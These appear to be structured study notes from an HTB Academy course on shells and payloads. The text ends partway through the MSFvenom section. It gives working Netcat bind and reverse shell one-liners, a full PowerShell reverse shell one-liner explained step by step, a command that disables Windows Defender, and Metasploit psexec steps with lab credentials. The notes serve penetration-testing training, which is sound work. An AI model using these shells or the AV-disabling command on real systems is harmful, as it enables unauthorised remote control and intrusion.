# Shells & Payloads — HTB Academy Structured Notes

> **Module:** Shells & Payloads | **Sections:** 1–18 | **Source:** HTB Academy

---

## Table of Contents

1. [Section 1 — Shells Jack Us In, Payloads Deliver Us Shells](#section-1)
2. [Section 2 — CAT5 Security's Engagement Preparation](#section-2)
3. [Section 3 — Anatomy of a Shell](#section-3)
4. [Section 4 — Bind Shells](#section-4)
5. [Section 5 — Reverse Shells](#section-5)
6. [Section 6 — Introduction to Payloads](#section-6)
7. [Section 7 — Automating Payloads & Delivery with Metasploit](#section-7)
8. [Section 8 — Crafting Payloads with MSFvenom](#section-8)
9. [Section 9 — Infiltrating Windows](#section-9)
10. [Section 10 — Infiltrating Unix/Linux](#section-10)
11. [Section 11 — Spawning Interactive Shells](#section-11)
12. [Section 12 — Introduction to Web Shells](#section-12)
13. [Section 13 — Laudanum, One Webshell to Rule Them All](#section-13)
14. [Section 14 — Antak Webshell](#section-14)
15. [Section 15 — PHP Web Shells](#section-15)
16. [Section 16 — The Live Engagement](#section-16)
17. [Section 17 — Detection & Prevention](#section-17)
18. [Section 18 — Complete Cheatsheet](#section-18)

---

<a name="section-1"></a>
## Section 1 — Shells Jack Us In, Payloads Deliver Us Shells

### What Is a Shell?

A shell is a program that provides a user with an interface to input instructions into the operating system and view text output. Common shells include Bash, Zsh, cmd, and PowerShell. In penetration testing, gaining a shell almost always means successfully exploiting a vulnerability on a target system to gain remote interactive control of that system's OS. Common phrases like "I caught a shell," "I popped a shell," or "I'm in!" all describe achieving this goal. This module focuses heavily on what happens **after** enumeration — using payloads and techniques to obtain and interact with shells on vulnerable machines.

---

### Why Get a Shell?

A shell gives direct access to the operating system, its commands, and its file system. Once shell access is established, a tester can enumerate the system for privilege escalation vectors, pivot to other hosts, transfer files, and exfiltrate data. Without a shell, progress on a target machine is severely limited. A CLI-based shell is much harder to detect compared to graphical remote access tools like VNC or RDP — making it the preferred method during engagements. Shell access also enables persistence, automation of attack steps, and a deeper foothold inside the target environment.

---

### Shell Perspectives

Shells are understood differently depending on the context in which they appear:

| Perspective | Description |
|---|---|
| **Computing** | The text-based userland environment used to administer tasks and submit instructions on a PC. Examples: Bash, Zsh, cmd, PowerShell. |
| **Exploitation & Security** | A shell gained by exploiting a vulnerability or bypassing security controls to achieve interactive access to a host. Example: triggering EternalBlue on Windows to access cmd remotely. |
| **Web** | A web shell exploits a vulnerability (such as unrestricted file upload) to allow the attacker to issue commands, read files, and perform destructive actions against the underlying host — controlled via a browser. |

---

### Payloads Deliver Us Shells

In the IT industry, "payload" has multiple meanings depending on the context:

| Context | Definition |
|---|---|
| **Networking** | The encapsulated data portion of a packet traversing a network. |
| **Basic Computing** | The portion of an instruction set that defines the action to be taken (headers and protocol info removed). |
| **Programming** | The data portion referenced or carried by the programming language instruction. |
| **Exploitation & Security** | Code crafted with the intent to exploit a vulnerability. Can describe various forms of malware including ransomware. |

In this module, payloads are the mechanism used to deliver and establish shell sessions on vulnerable systems. Different payload types and delivery methods will be explored throughout all sections.

---

<a name="section-2"></a>
## Section 2 — CAT5 Security's Engagement Preparation

### Overview

This section sets the stage for the entire module. The learner acts as a penetration tester working for CAT5 Security, preparing to engage the client Inlanefreight. Senior team members want to verify skills with shells and payloads before including the learner in a live engagement. The final module assessment is structured as a series of practical challenges that validate real-world readiness. All of the following skill areas must be demonstrated before the live engagement can begin.

---

### Shell Basics

The goal here is to replicate the ability to establish both bind and reverse shells in hands-on lab environments. Specifically, a bind shell must be created on a Linux host, and a reverse shell must be established on a Windows host. Understanding the difference between bind (target listens, attacker connects) and reverse (attacker listens, target connects back) shells is fundamental. These concepts form the foundation of every shell-based attack and persistence technique used in real penetration tests.

---

### Payload Basics

This area requires demonstrating the ability to launch payloads using Metasploit Framework, search for and build payloads from public PoC (Proof of Concept) resources on ExploitDB, and demonstrate knowledge of manual payload creation. Payloads are the code or commands delivered to a target to trigger execution and establish a shell. Understanding how to create, modify, and deliver payloads is critical. This bridges the gap between finding a vulnerability and actually gaining access to a system.

---

### Getting a Shell on Windows

Using recon results that will be provided, the learner must craft or use a payload that exploits the target Windows host and returns a shell back to the attack box. This demonstrates proficiency with Windows-specific attack vectors, payload formats, and tools like Metasploit, MSFvenom, or PowerShell. The ability to adapt to Windows environments — understanding how services like SMB are commonly exploited — is tested here.

---

### Getting a Shell on Linux

Similar to the Windows objective, this challenge requires using provided recon results to craft or use a payload to exploit a Linux host and establish a shell session. Linux servers are the dominant platform for web services globally, so attacking them is a core penetration testing skill. This tests knowledge of Linux-specific payloads, bash commands, file handling, and shell types available on Unix-based systems.

---

### Landing a Web Shell

This challenge requires identifying a common web application, recognizing the server-side language it uses (PHP, ASPX, JSP, etc.), and deploying a web shell payload that gives shell access directly from the browser. Web shells are a primary initial access technique during external penetration tests. This section validates the ability to identify file upload vulnerabilities, select the correct shell for the language in use, and successfully execute commands on the underlying web server.

---

### Spotting a Shell or Payload

This challenge requires detecting the presence of a payload or interactive shell on a host by analyzing relevant information such as network traffic, running processes, or log data. Defenders and testers alike must be able to recognize indicators of compromise. This section bridges offensive techniques with defensive awareness, reinforcing the idea that the best penetration testers also understand how to detect what they deploy.

---

### Final Challenge

The final challenge is the culmination of all skills learned in the module. The learner must utilize knowledge of payload selection, crafting, and deployment to gain access to multiple provided target hosts. Once a shell has been established on each host, specific information must be extracted to answer the challenge questions. This validates end-to-end penetration testing competency.

---

<a name="section-3"></a>
## Section 3 — Anatomy of a Shell

### Terminal Emulators

Every operating system has a shell, and to interact with it, a terminal emulator application is required. A terminal emulator is the graphical or CLI-based application that opens a window and lets you type commands that are passed to the shell interpreter. There are many terminal emulators available, and choosing one is primarily a matter of personal preference based on workflow. Below is a list of common terminal emulators by OS:

| Terminal Emulator | Operating System |
|---|---|
| Windows Terminal | Windows |
| cmder | Windows |
| PuTTY | Windows |
| kitty | Windows, Linux, MacOS |
| Alacritty | Windows, Linux, MacOS |
| xterm | Linux |
| GNOME Terminal | Linux |
| MATE Terminal | Linux |
| Konsole | Linux |
| Terminal | MacOS |
| iTerm2 | MacOS |

> Note: The terminal emulator available on target systems will depend on what is natively installed. We use whatever exists on the target.

---

### Command Language Interpreters

A command language interpreter is a program that interprets and executes instructions provided by the user, passing them to the OS for processing. The CLI is the combined result of: the operating system + the terminal emulator + the command language interpreter. Interpreters are sometimes called shell scripting languages or Command and Scripting interpreters, as described in MITRE ATT&CK's Execution technique category. Different interpreters recognize different commands and scripting syntax. Knowing which interpreter is running on a target determines what commands and scripts we can use.

---

### Hands-on with Terminal Emulators and Shells

On Parrot OS Pwnbox, clicking the green square icon opens the **MATE terminal emulator** pre-configured with a command language interpreter. When a random string is typed and Enter is pressed, the terminal responds with an error. The `$` sign visible in the terminal prompt is a clue — `$` is used by **Bash**, **Ksh**, **POSIX**, and many other shell languages to mark the start of the shell prompt. The error message "command not found" is Bash reporting that it did not recognize what was typed, confirming Bash as the active interpreter.

---

#### Shell Validation From 'ps'

To confirm which shell interpreter is running, use the `ps` command, which shows currently running processes.

**Command:**
```bash
ps
```

**What It Does:**  
`ps` (process status) lists the processes running in the current terminal session. The output includes the PID (Process ID), the TTY (terminal type), the time the process has been running, and the command name.

**Example Output:**
```
    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

**Explanation:**  
In the output above, `bash` appears under CMD, confirming that the Bash shell is the active command interpreter for this session. The `ps` command itself also appears because it was running at the time of the query.

---

#### Shell Validation Using 'env'

Another way to identify the active shell is by checking the environment variables.

**Command:**
```bash
env
```

**What It Does:**  
`env` prints all environment variables set for the current shell session. One of those variables, `SHELL`, stores the path to the current shell binary.

**Example Output:**
```
SHELL=/bin/bash
```

**Explanation:**  
The `SHELL=/bin/bash` entry confirms that Bash (`/bin/bash`) is the active shell interpreter. This is a quick and reliable way to verify the shell type on any Unix/Linux system.

---

### PowerShell vs. Bash

Clicking the blue square icon in Pwnbox opens the MATE terminal using **PowerShell** as the interpreter instead of Bash. This demonstrates an important concept: a terminal emulator is NOT tied to one specific shell language. The shell language can be changed and customized based on the need of a sysadmin, developer, or pentester. PowerShell on Linux uses a `PS >` style prompt, while Bash uses `$`. Commands recognized by Bash may not work in PowerShell and vice versa. This flexibility is both a feature and an important consideration when targeting systems — always identify what interpreter is running before executing commands.

---

<a name="section-4"></a>
## Section 4 — Bind Shells

### What Is It?

With a **bind shell**, the target system starts a listener and waits for the attacker (pentester's attack box) to connect to it. The flow is: **Target listens → Attacker connects**. The attacker directly connects to the target's IP address and the port where the listener is running. This is the opposite of a reverse shell. Bind shells can be useful in some scenarios, but they come with significant limitations — particularly around firewalls and NAT, which typically block incoming connections from unknown sources.

---

### Challenges of a Bind Shell

Using bind shells in real-world scenarios presents several difficulties:

- A listener must already be started on the target before you can connect.
- If no listener is running, a way to start one must be found first.
- Admins typically configure strict **incoming firewall rules** and **NAT (with PAT)** at the network edge, blocking unsolicited inbound connections.
- OS-level firewalls on both Windows and Linux will likely block incoming connections not associated with trusted applications.
- Bind shells rely on the attacker successfully reaching the target's open port from the outside — this is harder than reverse shells in hardened environments.

---

### Practicing with GNU Netcat

**Netcat (nc)** is known as the "Swiss Army Knife" of networking tools. It can function over TCP, UDP, and Unix sockets; use IPv4 and IPv6; open and listen on ports; act as a proxy; and handle text I/O. In a bind shell scenario, the target acts as the **server** (runs the listener), and the attack box acts as the **client** (connects to the listener).

---

#### No. 1: Server — Target Starting Netcat Listener

**Command (run on the target/server):**
```bash
nc -lvnp 7777
```

**What Each Flag Does:**
- `nc` — invokes Netcat
- `-l` — puts Netcat into listen mode (waits for incoming connections)
- `-v` — verbose output (shows connection activity)
- `-n` — disables DNS resolution (faster, uses raw IPs)
- `-p 7777` — specifies port 7777 to listen on

**Expected Output:**
```
Listening on [0.0.0.0] (family 0, port 7777)
```

The listener is now running and waiting for an incoming connection on all interfaces (`0.0.0.0`) on port 7777.

---

#### No. 2: Client — Attack Box Connecting to Target

**Command (run on the attack box/client):**
```bash
nc -nv 10.129.41.200 7777
```

**What Each Part Does:**
- `nc` — invokes Netcat
- `-n` — no DNS resolution
- `-v` — verbose output
- `10.129.41.200` — the IP address of the target (server)
- `7777` — the port the target is listening on

**Expected Output:**
```
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

This confirms the attack box has successfully connected to the target's Netcat listener on port 7777.

---

#### No. 3: Server — Target Receiving Connection from Client

After the client connects, the server side updates its output:

```
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

**Explanation:**  
The server (target) now shows that a connection was received from IP `10.10.14.117` on ephemeral port `51872`. At this point, both sides have an open TCP session. However, this is **not yet a shell** — it is just a raw Netcat TCP pipe. Text typed on one side appears on the other, but no OS commands can be executed yet.

---

#### No. 4: Client — Attack Box Sending Message "Hello Academy"

To test the connection, type a message on the client side:

```
Hello Academy
```

After pressing Enter, the message travels across the TCP connection to the server.

**What This Demonstrates:**  
The TCP pipe established by Netcat can transmit text in both directions. This is the raw foundation of what a bind shell builds upon. Without binding a shell to this pipe, only plain text can be exchanged — no command execution is possible.

---

#### No. 5: Server — Target Receiving "Hello Academy" Message

On the server (target) side, the message appears:

```
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

**Explanation:**  
The server received the text "Hello Academy" exactly as typed on the client side. This confirms two-way TCP communication is established. The next step is to bind an actual shell to this session so commands can be executed on the target system from the attack box.

---

### Establishing a Basic Bind Shell with Netcat

To create an actual bind shell (not just a text pipe), the target must bind its Bash shell to the Netcat listener. This requires piping the shell's input and output through the network connection.

---

#### No. 1: Server — Binding a Bash Shell to the TCP Session

**Command (run on the target):**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Step-by-Step Breakdown:**

| Part | Explanation |
|---|---|
| `rm -f /tmp/f` | Removes the file `/tmp/f` if it already exists. `-f` suppresses errors if the file doesn't exist. The `;` runs the next command sequentially. |
| `mkfifo /tmp/f` | Creates a **FIFO named pipe** at `/tmp/f`. A named pipe allows two processes to communicate — data written to one end is read from the other. |
| `cat /tmp/f` | Reads data from the named pipe. The pipe `\|` connects its output to `/bin/bash`. |
| `/bin/bash -i` | Starts Bash in interactive mode (`-i`). Interactive mode enables job control, prompts, and interactive command processing. |
| `2>&1` | Redirects stderr (stream 2) to stdout (stream 1) so error messages are also sent over the network. |
| `nc -l 10.129.41.200 7777` | Starts a Netcat listener on the target's IP and port 7777. |
| `> /tmp/f` | Redirects Netcat's output back into the named pipe, closing the loop: commands received by Netcat are fed into Bash. |

**Result:** The target is now serving a live Bash shell over the TCP connection on port 7777.

---

#### No. 2: Client — Connecting to Bind Shell on Target

**Command (run on the attack box):**
```bash
nc -nv 10.129.41.200 7777
```

**Expected Output:**
```
Target@server:~$
```

**Explanation:**  
After connecting, the attack box receives a live interactive Bash shell prompt from the target. The attacker can now type any command and see its output as if physically logged into the target. This is a fully functional bind shell. Note: in real engagements, bind shells are harder to use due to firewalls blocking inbound connections — reverse shells are generally preferred.

---

<a name="section-5"></a>
## Section 5 — Reverse Shells

### What Is a Reverse Shell?

With a **reverse shell**, the attack box runs the listener, and the **target connects back** to the attacker. The flow is: **Attacker listens → Target connects**. This is the most commonly used shell type in real penetration tests because outbound connections from the target (going out to the internet) are far less likely to be blocked by firewalls than inbound connections. The attack box becomes the server; the target becomes the client. Common methods to force a target to initiate the connection include: Unrestricted File Upload, Command Injection, and running a crafted payload on the target. The **Reverse Shell Cheat Sheet** is a well-known public resource containing many ready-to-use reverse shell one-liners.

---

### Hands-on With a Simple Reverse Shell in Windows

This walkthrough demonstrates establishing a reverse shell from a Windows target back to the attack box using a PowerShell one-liner. The attack box listens; the target is made to execute the PowerShell command, which initiates the connection back. The key advantage is that most environments allow outbound traffic on common ports like 443 (HTTPS), making it less likely to be blocked.

---

#### Server (Attack Box) — Starting Netcat Listener

**Command (run on the attack box):**
```bash
sudo nc -lvnp 443
```

**What Each Flag Does:**
- `sudo` — runs Netcat with elevated privileges (needed for ports below 1024)
- `nc` — invokes Netcat
- `-l` — listen mode
- `-v` — verbose
- `-n` — no DNS resolution
- `-p 443` — listen on port 443 (HTTPS port, rarely blocked outbound)

**Expected Output:**
```
Listening on 0.0.0.0 443
```

Port 443 is chosen deliberately. Most firewalls allow outbound HTTPS (port 443) traffic. By listening on 443, the reverse shell connection from the target is more likely to pass through firewall rules without triggering alerts.

---

#### Client (Target) — PowerShell Reverse Shell Command

**Command (run on the Windows target's Command Prompt):**
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**High-Level Breakdown:**  
This one-liner creates a TCP connection to the attacker's IP on port 443, reads commands from the attacker, executes them on the Windows target using `Invoke-Expression`, and sends the output back over the same connection. It creates a full interactive reverse shell session from within a Windows Command Prompt.

> **Important:** Replace `10.10.14.158` with your actual attack box IP address.

---

#### Windows Defender Blocking the Payload

When the command is pasted and executed, Windows Defender (AV) may block it:

```
This script contains malicious content and has been blocked by your antivirus software.
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**Explanation:**  
Windows Defender detected the PowerShell script as malicious and blocked it before it could execute. From a defensive perspective, this is the expected and desired behavior. From an offensive perspective, it means we need to either bypass or disable AV to proceed in a test environment.

---

#### Disable AV

**Command (run in an administrative PowerShell console on the target):**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**What It Does:**  
`Set-MpPreference` is a PowerShell cmdlet used to configure Windows Defender settings. The `-DisableRealtimeMonitoring $true` parameter turns off real-time protection, allowing payloads to execute without being blocked. This must be run in an **elevated (admin) PowerShell prompt** (right-click → Run as Administrator). In real engagements, bypassing AV without disabling it is preferred — this approach is only used in controlled lab environments.

---

#### Server (Attack Box) — Connection Received & Shell Access

After AV is disabled and the PowerShell command is re-executed, the attack box receives the callback:

```
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student>
```

**Command used to verify:**
```bash
whoami
```

**Output:**
```
ws01\htb-student
```

**Explanation:**  
The `PS` prompt prefix and the `C:\` path confirm that we now have a PowerShell-based reverse shell on the Windows target. The `whoami` command confirms the user account under which the shell is running (`htb-student` on machine `ws01`).

---

<a name="section-6"></a>
## Section 6 — Introduction to Payloads

### What Is a Payload?

A payload is the intended message or action within a packet, program, or exploit. In information security, a payload is the command or code that exploits the vulnerability in an OS or application. When we delivered the PowerShell script to the Windows host earlier, that script **was** the payload — it contained instructions for the target computer to follow. The terms "malware" and "malicious code" are used loosely, but in practice a payload is just code with a specific purpose. Understanding exactly what payloads do helps us understand why AV blocks them and how to modify them to bypass restrictions.

---

### One-Liners Examined

#### Netcat/Bash Reverse Shell One-liner

**Full Command:**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

This is a commonly used one-liner for establishing a reverse shell on a Linux system using Netcat. It is frequently copied and pasted during engagements without full understanding. The following subsections break down each component.

---

#### Remove /tmp/f

```bash
rm -f /tmp/f;
```

**Explanation:**  
`rm` removes files. The `-f` flag forces removal without prompting for confirmation and ignores errors if the file doesn't exist. `/tmp/f` is the file being removed — this is the named pipe that will be created next. Removing it first ensures a clean start. The `;` separates this command from the next, causing them to execute sequentially.

---

#### Make A Named Pipe

```bash
mkfifo /tmp/f;
```

**Explanation:**  
`mkfifo` creates a **FIFO (First In, First Out) named pipe** at the path `/tmp/f`. A named pipe is a special type of file in Linux that allows inter-process communication — data written into one end can be read out of the other. This pipe is the key that links Bash's output to Netcat's input, creating a bidirectional communication channel. The `;` again sequences execution.

---

#### Output Redirection

```bash
cat /tmp/f |
```

**Explanation:**  
`cat` reads the contents of `/tmp/f` (the named pipe) and outputs it. The pipe operator `|` connects the standard output of `cat /tmp/f` to the standard input of the next command. Effectively, anything that Netcat receives from the attacker is fed into this pipeline, eventually reaching `/bin/bash` for execution.

---

#### Set Shell Options

```bash
/bin/bash -i 2>&1 |
```

**Explanation:**  
`/bin/bash` starts the Bash shell. The `-i` flag enables **interactive mode**, which activates job control, prompt display, and interactive features. `2>&1` redirects **stderr** (file descriptor 2) to **stdout** (file descriptor 1), so both error messages and regular output flow through the same stream. The `|` connects the output of Bash to Netcat, so all command results are sent over the network.

---

#### Open a Connection with Netcat

```bash
nc 10.10.14.12 7777 > /tmp/f
```

**Explanation:**  
`nc` (Netcat) initiates an outbound TCP connection to the attacker's machine at IP `10.10.14.12` on port `7777`. The `>` redirects Netcat's received output (commands typed by the attacker) into `/tmp/f` (the named pipe). This closes the loop: attacker types a command → Netcat receives it → writes to the pipe → Bash reads from the pipe → executes the command → sends output back via `2>&1 | nc`.

---

### PowerShell One-liner Explained

#### Calling PowerShell

```cmd
powershell -nop -c
```

**Explanation:**  
`powershell` launches `powershell.exe`. `-nop` stands for **no profile**, which prevents PowerShell from loading the user's profile script (`profile.ps1`) on startup — this makes execution faster and avoids potential blocks. `-c` (short for `-Command`) tells PowerShell to execute the command or script block that follows inside the quotes. This syntax is used from within `cmd.exe`, which is why `powershell` is at the start.

---

#### Binding A Socket

```cmd
"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

**Explanation:**  
`$client` is a PowerShell variable. `New-Object` creates a new instance of a .NET object — here it's `System.Net.Sockets.TCPClient`, which creates a TCP client connection to `10.10.14.158` on port `443`. This is the step that establishes the actual TCP connection back to the attacker's listener. The `;` ensures sequential execution of all parts of the one-liner.

---

#### Setting The Command Stream

```cmd
$stream = $client.GetStream();
```

**Explanation:**  
`$stream` holds the network stream object. `.GetStream()` is a .NET method on the `TCPClient` object that returns a `NetworkStream` — this is the actual bidirectional data channel over which commands and output flow between the attacker and the target. All read/write operations on this connection go through `$stream`.

---

#### Empty Byte Stream

```cmd
[byte[]]$bytes = 0..65535|%{0};
```

**Explanation:**  
`[byte[]]$bytes` declares a byte array. `0..65535` generates a range of integers from 0 to 65535 (65,536 values). `|%{0}` pipes each integer through a `ForEach-Object` block that replaces each value with `0`. This creates an **empty byte array** of size 65,536 bytes (64 KB). This buffer is used to receive data from the network stream in chunks.

---

#### Stream Parameters

```cmd
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

**Explanation:**  
This is a `while` loop that continuously reads data from the network stream. `$stream.Read($bytes, 0, $bytes.Length)` reads bytes from the stream into the buffer `$bytes`, starting at offset `0`, up to the buffer's full length. It returns the number of bytes read and stores that in `$i`. The loop continues as long as `$i` is not 0 (i.e., as long as the connection is alive and data is being received).

---

#### Set The Byte Encoding

```cmd
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

**Explanation:**  
`System.Text.ASCIIEncoding` is a .NET class for ASCII encoding. `.GetString($bytes, 0, $i)` converts the raw bytes in the buffer `$bytes` (from index `0` to `$i`) into a readable ASCII string stored in `$data`. This converts the binary network data into the actual command text that the attacker typed on the attack box.

---

#### Invoke-Expression

```cmd
$sendback = (iex $data 2>&1 | Out-String );
```

**Explanation:**  
`iex` is the alias for `Invoke-Expression`, a PowerShell cmdlet that **executes a string as a PowerShell command**. The string `$data` (the command received from the attacker) is executed on the target machine. `2>&1` captures both error and standard output. `| Out-String` converts the output into a plain string. The result (what the command produced) is stored in `$sendback`.

---

#### Show Working Directory

```cmd
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

**Explanation:**  
`$sendback2` is constructed by combining: the command output (`$sendback`) + the literal string `'PS '` + the current working directory path (`(pwd).Path`) + `'> '`. This creates the prompt that appears on the attacker's side, making the shell look like a real PowerShell prompt: `PS C:\Users\htb-student> `. The `+` operator concatenates strings in PowerShell.

---

#### Sets Sendbyte

```cmd
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
```

**Explanation:**  
- `([text.encoding]::ASCII).GetBytes($sendback2)` — converts the string `$sendback2` (the output + prompt) into raw ASCII bytes stored in `$sendbyte`.
- `$stream.Write($sendbyte, 0, $sendbyte.Length)` — writes those bytes back to the attacker over the TCP stream.
- `$stream.Flush()` — forces the stream buffer to send the data immediately rather than waiting for it to fill.
This is what delivers the command results and the new prompt back to the attacker's Netcat listener.

---

#### Terminate TCP Connection

```cmd
$client.Close()"
```

**Explanation:**  
`$client.Close()` is the `TcpClient.Close()` method, which cleanly terminates the TCP connection. This runs when the `while` loop exits (i.e., when no more data is being received, meaning the connection has ended). The closing `"` marks the end of the entire `-c` script block passed to `powershell.exe`.

---

### Invoke-PowerShellTcp (Nishang Script)

The PowerShell one-liner above can also be expressed as a full PowerShell script (`.ps1` file). The **Nishang project** provides a function called `Invoke-PowerShellTcp` that encapsulates all the same logic in a clean, reusable PowerShell function. It supports both **-Reverse** and **-Bind** modes via switch parameters:

- `-Reverse -IPAddress 192.168.254.226 -Port 4444` — establishes a reverse shell back to the attacker
- `-Bind -Port 4444` — listens on a port for the attacker to connect to
- Supports **IPv6** as well

The script sends the current username and computer name upon connection and shows a live interactive PowerShell prompt. All modules in Nishang (and Metasploit) are written in **Ruby** or **PowerShell** and can be customized for specific engagements.

---

### Payloads Take Different Shapes and Forms

Not all payloads are simple one-liners typed manually. Payloads come in many different formats depending on the target OS, the interpreter available, and the deployment method. Understanding what the payload does helps identify why AV blocks it and how it can be modified. Some payloads are pre-packaged inside exploit frameworks like **Metasploit**, which handles generation and delivery automatically. The type of payload to use is largely determined by: what OS is running on the target, what shell interpreter languages exist, and what programming languages or runtimes are available on the target system.

---

<a name="section-7"></a>
## Section 7 — Automating Payloads & Delivery with Metasploit

### Overview of Metasploit

Metasploit is an automated attack framework developed by **Rapid7** that streamlines exploitation through pre-built modules with easy-to-use options. It handles enumeration, exploitation, payload delivery, and post-exploitation. The community edition is available free and is pre-installed on Parrot OS (Pwnbox). A paid version called **Metasploit Pro** is used by many professional cybersecurity firms. When using Metasploit, understanding what the tools are doing — not just clicking through them — is critical to responsible and effective use in real engagements.

---

### Starting MSF

**Command:**
```bash
sudo msfconsole
```

**What It Does:**  
`sudo` runs msfconsole with root privileges. `msfconsole` launches the Metasploit Framework interactive console. On startup, it displays creative ASCII art and a summary of available modules:

```
2131 exploits
592 payloads
45 encoders
8 evasion modules
```

These numbers reflect the total modules available and may change as Metasploit is updated. The `msf6 >` prompt indicates the console is ready for commands.

---

### NMAP Scan

**Command:**
```bash
nmap -sC -sV -Pn 10.129.164.25
```

**What Each Flag Does:**
- `-sC` — runs default Nmap scripts against open ports (service fingerprinting, banner grabbing, etc.)
- `-sV` — performs service/version detection
- `-Pn` — skips host discovery (treats all hosts as up); useful when ICMP is blocked

**Example Output (relevant ports):**
```
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7-10 microsoft-ds
```

**Explanation:**  
The output reveals that ports 135, 139, and 445 are open — all standard Windows services. Port 445 indicates **SMB** is running. SMB is a common attack vector, especially against older Windows systems. The scan also reveals this is a Windows machine in a WORKGROUP environment. Based on this, SMB is selected as the potential attack vector.

---

### Searching Within Metasploit

**Command (inside msfconsole):**
```bash
search smb
```

**What It Does:**  
The `search` command queries Metasploit's database of modules using a keyword. Here, `smb` returns all modules related to the SMB protocol. The output is a numbered table with columns: **#, Name, Disclosure Date, Rank, Check, Description**. The module number in the table is **relative to the current search** and may change — always reference modules by their full name rather than number in scripts.

---

### Option Selection

**Command:**
```bash
use 56
```

or equivalently:
```bash
use exploit/windows/smb/psexec
```

**What It Does:**  
`use` selects a Metasploit module to work with. After selection, the prompt changes to:
```
msf6 exploit(windows/smb/psexec) >
```

**Automatic Payload Selection:**
```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Metasploit automatically selects `windows/meterpreter/reverse_tcp` as the default payload. This is a **Meterpreter** reverse shell — more capable than a raw TCP shell because it uses **in-memory DLL injection** for stealth and provides an extended command set.

**Module Name Breakdown (`exploit/windows/smb/psexec`):**

| Part | Meaning |
|---|---|
| `exploit/` | Module type: this is an exploitation module |
| `windows/` | Target platform: Windows |
| `smb/` | Attack vector: SMB protocol |
| `psexec` | Tool uploaded to the target (similar to SysInternals PsExec) |

---

### Examining an Exploit's Options

**Command:**
```bash
options
```

**What It Does:**  
Displays all configurable parameters for the selected module, showing current values, whether they are required, and a description. Key fields:

| Option | Description |
|---|---|
| `RHOSTS` | Target host IP(s) — required |
| `RPORT` | Target SMB port (default: 445) |
| `SHARE` | SMB share to upload to (e.g., ADMIN$) |
| `SMBDomain` | Windows domain (default: `.` for local) |
| `SMBPass` | Target user's password |
| `SMBUser` | Target username |
| `LHOST` | Attacker's IP (for reverse shell callback) |
| `LPORT` | Attacker's listening port (default: 4444) |

---

### Setting Options

**Commands:**
```bash
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.222
```

**What Each Does:**
- `set RHOSTS` — sets the target IP address
- `set SHARE ADMIN$` — uses the default Windows admin share `ADMIN$` for file upload
- `set SMBPass` — sets the password for SMB authentication
- `set SMBUser` — sets the username for SMB authentication
- `set LHOST` — sets our attack box IP so the Meterpreter shell connects back to us

**Note:** LHOST can be set to the VPN tunnel IP or the VPN interface ID. These values are specific to your attack box and the credentials obtained during reconnaissance.

---

### Exploits Away

**Command:**
```bash
exploit
```

**What It Does:**  
Executes the configured exploit. Metasploit reports each step:

```
[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] Connecting to the server...
[*] Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] Selecting PowerShell target
[*] Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (...) at 2021-09-13 17:43:41 +0000
meterpreter >
```

**What Happened:**  
Metasploit authenticated over SMB, uploaded PsExec, executed the Meterpreter payload, and established a reverse TCP session. The `meterpreter >` prompt means we now have a **Meterpreter shell** on the target.

---

### Interactive Shell

**Command (inside Meterpreter):**
```bash
shell
```

**What It Does:**  
The `shell` command within Meterpreter drops the attacker into a **system-level interactive shell** on the target. This provides access to the full set of Windows CMD commands natively.

**Expected Output:**
```
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
C:\WINDOWS\system32>
```

**Explanation:**  
Meterpreter itself has a limited command set. Typing `shell` spawns a new process on the target (cmd.exe) and creates a communication channel to it, giving full access to all native system commands. Use `?` in Meterpreter to see available Meterpreter-specific commands before dropping into the system shell.

---

<a name="section-8"></a>
## Section 8 — Crafting Payloads with MSFvenom

### Overview of MSFvenom

MSFvenom is a standalone tool within the Metasploit Framework used to craft custom payloads for delivery outside of the Metasploit console. It is useful in situations where the attacker does not have direct network access to the target and must send the payload via alternative means (email attachment, USB drive, download link, etc.). MSFvenom also supports encoding and encrypting payloads to bypass common anti-virus detection signatures.

---

### Practicing with MSFvenom

#### List Payloads

**Command:**
```bash
msfvenom -l payloads
```

**What It Does:**  
Lists all 592+ available payloads in Metasploit Framework. The output shows each payload's **Name** and a brief **Description**. The naming convention of payloads follows a pattern:  
`OS/architecture/shell_type/network_method`

For example:
